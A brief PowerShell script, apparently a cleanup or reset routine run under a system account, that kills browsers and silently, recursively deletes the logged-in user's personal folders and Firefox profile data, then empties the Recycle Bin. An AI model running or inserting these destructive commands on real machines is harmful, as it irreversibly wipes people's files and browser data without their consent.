# Get real logged-in user profile (not SYSTEM)
$User = (Get-CimInstance Win32_ComputerSystem).UserName.Split('\')[-1]
$U = "C:\Users\$User"

# Kill browsers
taskkill /f /im firefox.exe 2>$null
taskkill /f /im chrome.exe 2>$null
taskkill /f /im msedge.exe 2>$null

$paths = @(
  "$U\Desktop\*",
  "$U\Documents\*",
  "$U\Downloads\*",
  "$U\Pictures\*",
  "$U\Videos\*",
  "$U\AppData\Local\Temp\*",
  "$U\AppData\Local\Mozilla\*",
  "$U\AppData\Roaming\Mozilla\*"
)

foreach ($p in $paths) {
    Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
}

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
